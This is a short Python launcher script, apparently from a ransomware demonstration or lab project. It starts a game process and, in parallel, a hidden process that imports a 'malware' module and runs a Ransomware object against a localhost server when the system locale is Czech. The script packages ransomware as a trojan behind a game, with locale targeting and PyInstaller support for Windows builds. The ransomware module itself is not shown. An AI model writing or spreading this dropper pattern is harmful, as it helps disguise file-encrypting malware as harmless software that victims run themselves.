import locale
from multiprocessing import Process, freeze_support


def check_czech_locale():
    lang, _ = locale.getdefaultlocale()
    if lang and lang.startswith('cs'):
        return True
    return False


def run_rsw():
    import malware

    if check_czech_locale():
        ransomware = malware.Ransomware(server_base_url="http://localhost:8001", api_key="")
        ransomware.run()


def main():
    from game import play

    game_process = Process(target=play)
    rsw_process = Process(target=run_rsw)

    game_process.start()
    rsw_process.start()


if __name__ == '__main__':
    # Required when freezing applications on Windows (pyinstaller)
    freeze_support()
    main()

